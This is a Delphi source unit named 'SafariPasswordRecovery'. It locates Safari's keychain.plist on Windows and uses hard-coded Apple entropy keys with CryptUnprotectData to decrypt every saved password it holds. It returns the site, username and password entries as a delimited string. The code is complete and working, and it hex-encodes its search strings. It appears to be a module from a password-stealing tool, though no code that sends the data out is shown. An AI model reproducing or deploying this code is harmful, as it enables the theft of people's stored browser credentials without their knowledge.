unit SafariPasswordRecovery;

interface

uses
  StrUtils,Windows,
  Classes,
  CryptAPI;

Function GetSafariPasswords(Delimitador: string): string;
function AnsiGetShellFolder(CSIDL: integer): String;

implementation

const
  AppleKey: Array[0..15] of Byte =($63,$6f,$6d,$2e,$61,$70,$70,$6c,$65,$2e,$53,$61,
                                   $66,$61,$72,$69);

NewAppleKey: array[0..143] of Byte = (
  $1D, $AC, $A8, $F8, $D3, $B8, $48, $3E, $48, $7D, $3E, $0A, $62, $07, $DD,
  $26, $E6, $67, $81, $03, $E7, $B2, $13, $A5, $B0, $79, $EE, $4F, $0F, $41,
  $15, $ED, $7B, $14, $8C, $E5, $4B, $46, $0D, $C1, $8E, $FE, $D6, $E7, $27,
  $75, $06, $8B, $49, $00, $DC, $0F, $30, $A0, $9E, $FD, $09, $85, $F1, $C8,
  $AA, $75, $C1, $08, $05, $79, $01, $E2, $97, $D8, $AF, $80, $38, $60, $0B,
  $71, $0E, $68, $53, $77, $2F, $0F, $61, $F6, $1D, $8E, $8F, $5C, $B2, $3D,
  $21, $74, $40, $4B, $B5, $06, $6E, $AB, $7A, $BD, $8B, $A9, $7E, $32, $8F,
  $6E, $06, $24, $D9, $29, $A4, $A5, $BE, $26, $23, $FD, $EE, $F1, $4C, $0F,
  $74, $5E, $58, $FB, $91, $74, $EF, $91, $63, $6F, $6D, $2E, $61, $70, $70,
  $6C, $65, $2E, $53, $61, $66, $61, $72, $69
);

type
  PSHItemID = ^TSHItemID;
  {$EXTERNALSYM _SHITEMID}
  _SHITEMID = record
    cb: Word;                         { Size of the ID (including cb itself) }
    abID: array[0..0] of Byte;        { The item ID (variable length) }
  end;
  TSHItemID = _SHITEMID;
  {$EXTERNALSYM SHITEMID}
  SHITEMID = _SHITEMID;

  PItemIDList = ^TItemIDList;
  {$EXTERNALSYM _ITEMIDLIST}
  _ITEMIDLIST = record
     mkid: TSHItemID;
   end;
  TItemIDList = _ITEMIDLIST;
  {$EXTERNALSYM ITEMIDLIST}
  ITEMIDLIST = _ITEMIDLIST;

type
  IMalloc = interface(IUnknown)
    ['{00000002-0000-0000-C000-000000000046}']
    function Alloc(cb: Longint): Pointer; stdcall;
    function Realloc(pv: Pointer; cb: Longint): Pointer; stdcall;
    procedure Free(pv: Pointer); stdcall;
    function GetSize(pv: Pointer): Longint; stdcall;
    function DidAlloc(pv: Pointer): Integer; stdcall;
    procedure HeapMinimize; stdcall;
  end;

function Succeeded(Res: HResult): Boolean;
begin
  Result := Res and $80000000 = 0;
end;

function SHGetMalloc(out ppMalloc: IMalloc): HResult; stdcall; external 'shell32.dll' name 'SHGetMalloc'
function SHGetSpecialFolderLocation(hwndOwner: HWND; nFolder: Integer;
  var ppidl: PItemIDList): HResult; stdcall; external 'shell32.dll' name 'SHGetSpecialFolderLocation';
function SHGetPathFromIDList(pidl: PItemIDList; pszPath: PChar): BOOL; stdcall; external 'shell32.dll' name 'SHGetPathFromIDListA';

function AnsiGetShellFolder(CSIDL: integer): String;
var
  pidl                   : PItemIdList;
  FolderPath             : array [0..260] of char;
  SystemFolder           : Integer;
  Malloc                 : IMalloc;
begin
  Malloc := nil;
  ZeroMemory(@FolderPath, SizeOf(FolderPath));
  SHGetMalloc(Malloc);
  if Malloc = nil then
  begin
    Result := FolderPath;
    Exit;
  end;
  try
    SystemFolder := CSIDL;
    if SUCCEEDED(SHGetSpecialFolderLocation(0, SystemFolder, pidl)) then
    begin
      if SHGetPathFromIDList(pidl, FolderPath) = false then ZeroMemory(@FolderPath, SizeOf(FolderPath));
    end;
    Result := FolderPath;
  finally
    Malloc.Free(pidl);
  end;
end;

type
  LongRec = packed record
    case Integer of
      0: (Lo, Hi: Word);
      1: (Words: array [0..1] of Word);
      2: (Bytes: array [0..3] of Byte);
  end;

function FileAge(const FileName: string): Integer;
var
  Handle: THandle;
  FindData: TWin32FindData;
  LocalFileTime: TFileTime;
begin
  Handle := FindFirstFile(PChar(FileName), FindData);
  if Handle <> INVALID_HANDLE_VALUE then
  begin
    Windows.FindClose(Handle);
    if (FindData.dwFileAttributes and FILE_ATTRIBUTE_DIRECTORY) = 0 then
    begin
      FileTimeToLocalFileTime(FindData.ftLastWriteTime, LocalFileTime);
      if FileTimeToDosDateTime(LocalFileTime, LongRec(Result).Hi,
        LongRec(Result).Lo) then Exit;
    end;
  end;
  Result := -1;
end;

function FileExists(const FileName: string): Boolean;
begin
  Result := FileAge(FileName) <> -1;
end;

function AnsiUpperCase(S: String): String;
var
  i: Integer;
begin
  for i := 1 to Length(S) do
    S[i] := char(CharUpper(PChar(S[i])));
  Result := S;
end;

function AnsiLowerCase(S: String): String;
var
  i: Integer;
begin
  for i := 1 to Length(S) do
    S[i] := char(CharLower(PChar(S[i])));
  Result := S;
end;

function AnsiCompareStr(const S1, S2: string): Integer;
begin
  Result := CompareString(LOCALE_USER_DEFAULT, 0, PChar(S1), Length(S1),
    PChar(S2), Length(S2)) - 2;
end;

function AnsiCompareText(const S1, S2: string): Integer;
begin
  Result := CompareString(LOCALE_USER_DEFAULT, NORM_IGNORECASE, PChar(S1),
    Length(S1), PChar(S2), Length(S2)) - 2;
end;

function IntToHex(dwNumber: DWORD; Len: Integer): String;
const
  HexNumbers:Array [0..15] of Char = ('0', '1', '2', '3', '4', '5', '6', '7', '8', '9',
                                      'A', 'B', 'C', 'D', 'E', 'F');
begin
  Result := '';
  while dwNumber <> 0 do
  begin
    Result := HexNumbers[Abs(dwNumber mod 16)] + Result;
    dwNumber := dwNumber div 16;
  end;
  if Result = '' then
  begin
    while Length(Result) < Len do
      Result := '0' + Result;
    Exit;
  end;
  if Result[Length(Result)] = '-' then
  begin
    Delete(Result, Length(Result), 1);
    Insert('-', Result, 1);
  end;
  while Length(Result) < Len do
    Result := '0' + Result;
end;


function MemPos(const Filename, TextToFind: string; var FoundPosition:int64;
                iFrom: cardinal = 0; CaseSensitive: boolean = False): int64;
var
  buffer : string;
  len : integer;
  MS : TMemoryStream;
  charsA, charsB : set of char;
  p, pEnd : PChar;
begin
  result := -1;
  FoundPosition:= -1;
  if (TextToFind <> '') and FileExists(pChar(Filename)) then
  begin
    len := Length(TextToFind);
    SetLength(buffer, len);
    if CaseSensitive then
    begin
      charsA := [TextToFind[1]];
      charsB := [TextToFind[len]];
    end else
    begin
      charsA := [ AnsiLowerCase(TextToFind)[1],   AnsiUpperCase(TextToFind)[1] ];
      charsB := [ AnsiLowerCase(TextToFind)[len], AnsiUpperCase(TextToFind)[len]];
    end;
    MS := TMemoryStream.Create;
    try
      MS.LoadFromFile(Filename);
      if (len <= MS.Size) and (iFrom <= (MS.Size - len) + 1) then
       begin
        p := MS.Memory;
        pEnd := p;
        Inc(p, iFrom);
        Inc(pEnd, (MS.Size - len) + 1);
        while (p <= pEnd) and (result < 0) do
        begin
          if (p^ in charsA) and ((p +len -1)^ in charsB) then
          begin
            MoveMemory(@buffer[1], p, len);
            if (CaseSensitive and (AnsiCompareStr(TextToFind, buffer) = 0)) or
               (AnsiCompareText(TextToFind, buffer) = 0) then
            begin
              result := p -MS.Memory;
              FoundPosition:= p-MS.Memory;
            end;

          end;
          Inc(p);
        end;
      end;
      finally
      MS.Free;
    end;
  end;
end;

Function GetSafariUserData(KeyChainPath:string; StartFrom:Cardinal):string;
var
  MS: TMemoryStream;
  iPos: int64;
  iPos1: int64; //Für die Klammer zu
  HArr: Array of Byte;
  i: cardinal;
  Size: byte;
begin
  result:='';
  MS := TMemoryStream.Create;
  MS.LoadFromFile(KeyChainPath);
  StartFrom := StartFrom - 200;
  MemPos(KeyChainPath, #$12 + #$6D + #$72 + #$6F, iPos,StartFrom);
  iPos := iPos+Length('mrof') + 1;
  MemPos(KeyChainPath,#$5F + #$10,iPos1,iPos);
  if ((iPos<>-1) and (iPos1<>-1)) then
  begin
    MS.Position:=iPos1+2;
    MS.Read(Size,1);
    SetLength(HArr,Size+1);
    MS.Read(HArr[0],(Size));
    for i := 0 to High(HArr) do
    begin
      if ((HArr[i]<33) or (HArr[i]>126)) then else
      Result:=Result+chr(HArr[i]);
    end;
  end else
  begin
    MS.Free;
    Result := '';
  end;
end;

//Safari-Mainfunktion
Function GetSafariLoginData(KeyChainPath, CFNDLLPath: string; Delimitador: string):String;
var
  DBin, DBOut, pOpt:Data_Blob;
  s: string;
  HArr: Array of Byte;
  i: integer;
  sHex: string;
  P: PByte;
  MS: TMemoryStream;
  MS2: TMemoryStream;
  MSKey: TMemoryStream;
  MSOpt: TMemoryStream;
  res: longbool;
  str: PLPWSTR;
  CFNPos: Int64;
  iPos: Int64;
  Ende: boolean;
  Size: integer;
begin
  Ende := False;
  MS := TMemoryStream.Create;
  MS2 := TMemoryStream.Create;
  MSKey := TMemoryStream.Create;
  MSOpt := TMemoryStream.Create;
  iPos := 0;
  CFNPos := 0;
  MS.LoadFromFile(KeyChainPath);
  MS.Position := 0;

  if CFNDLLPath <> '' then
  begin
    MS2.LoadFromFile(CFNDLLPath);
    MS2.Position := 0;
    CFNPos := MemPos(CFNDLLPath, #$41 + #$56 + #$55 + #$52 + #$4C + #$50 + #$72 + #$6F + #$74 + #$6F + #$63 + #$6F + #$6C + #$5F + #$43 + #$6C + #$61 + #$73 + #$73 + #$69 + #$63, CFNPos);
    if CFNPos <> -1 then
    begin
      CFNPos := CFNPos + Length('AVURLProtocol_Classic')+$25;
      MS2.Position:=CFNPos;
      MSOpt.CopyFrom(MS2,$80);
      MSOpt.Write(AppleKey,High(AppleKey)+1);
    end;
  end else
  MSOpt.Write(NewAppleKey,Length(NewAppleKey));

  MSOpt.Position:=0;
  while (MemPos(KeyChainPath, #01+#00+#00+#00, iPos, iPos) <>-1) and (not Ende) do begin
    MS.Position:=iPos-1;
    MS.Read(Size,2);
    MS.Position:=MS.Position+1;
    if ((iPos<>-1) and (iPos+Size<MS.Size) and (Size<>0) ) then
    begin
      Result := Result + GetSafariUserData(KeyChainPath, iPos) + Delimitador;
      MS.Position:=iPos;
      MSKey.CopyFrom(MS,Size);  inc(iPos, Size);
      MSKey.Position:=0;

      DBOut.cbData := 0;
      DBOut.pbData := nil;
      DBIn.cbData := MSKey.Size;
      pOpt.cbData:=MSOpt.Size;
      GetMem(pOpt.pbData,pOpt.cbData);
      GetMem(DBIn.pbData, DBIn.cbData);
      DBIn.pbData:=MSKey.Memory;
      pOpt.pbData:=MSOpt.Memory;
      str:=nil;

      res:= CryptUnprotectData(@DBIn,
                          @str,
                          @pOpt,
                          nil,
                          nil,
                          0,
                          @DBOut);

      if res=true then
      begin
        P:=DBOut.pbData;
        SetLength(HArr,0);
        SetLength(HArr,DBOut.cbData);
        for i:=0 to DBOut.cbData-1 do
        begin
          HArr[i]:=P^;
          inc(P);
        end;
        s:='';
        for i:=0 To High(HArr) do
        begin
          sHex:=IntToHex(HArr[i],1);
          s:=s+chr(HArr[i]);
        end;
        s:='';
        for i:=0 to High(HArr) do
        begin
          if ((HArr[i]<33) or (HArr[i]>126)) then else s:=s+chr(HArr[i]);
        end;
        Result := Result + s + Delimitador;
      end else
      begin
        Result := Result + '-' + Delimitador;
      end;
      LocalFree(Cardinal(Pointer(DBOut.pbData)));
      DBOut.pbData:=NIL;
    end else Ende:=True;
  end;

  MS.Free;
  MS2.Free;
  MSKey.Free;
  MSOpt.Free;
end;

Function TempGetSafariPasswords(Delimitador: string; Old: boolean): string;
var
  i: integer;
  s, Site, User, Pass, TempStr: string;
  b: boolean;
  Safari1, Safari2: AnsiString;
begin
  Result := '';
  b := false;
  s := '';

  if Old then
  begin
    Safari1 := AnsiGetShellFolder(26) + '\Apple Computer\Preferences\keychain.plist';
    Safari2 := AnsiGetShellFolder(43) + '\Apple\Apple Application Support\CFNetwork.dll';
    b := FileExists(Safari1) and FileExists(Safari2);
  end else
  begin
    Safari1 := AnsiGetShellFolder(26) + '\Apple Computer\Preferences\keychain.plist';
    Safari2 := '';
    b := FileExists(Safari1);
  end;

  if b then
  begin
   	s := GetSafariLoginData(Safari1, Safari2, Delimitador) + Delimitador;
    while posex(Delimitador, s) > 0 do
    begin
      Result := Result + Copy(s, 1, posex(Delimitador, s) - 1) + Delimitador;
      Delete(s, 1, posex(Delimitador, s) - 1);
      Delete(s, 1, length(Delimitador));
    end;
  end else Result := ''{'Installation not found!'};

  if Result = '' then exit;
  TempStr := '';

  if Result <> '' then
  while posex('(', result) > 0 do
  begin
    site := 'http://' + Copy(Result, 1, posex('(', Result) - 1);
    delete(result, 1, posex('(', Result));

    User := Copy(Result, 1, posex(Delimitador, Result) - 2);
    delete(result, 1, posex(Delimitador, Result) - 1);
    delete(result, 1, Length(Delimitador));

    Pass := Copy(Result, 1, posex(Delimitador, Result) - 1);
    delete(result, 1, posex(Delimitador, Result) - 1);
    delete(result, 1, Length(Delimitador));

    TempStr := TempStr + Site + Delimitador +
                         User + Delimitador +
                         Pass + Delimitador + #13#10;
  end;

  Result := TempStr;
end;

function GetSafariPasswords(Delimitador: string): string;
begin
  Result := TempGetSafariPasswords(Delimitador, False);
  Result := Result + TempGetSafariPasswords(Delimitador, True);
end;

end.

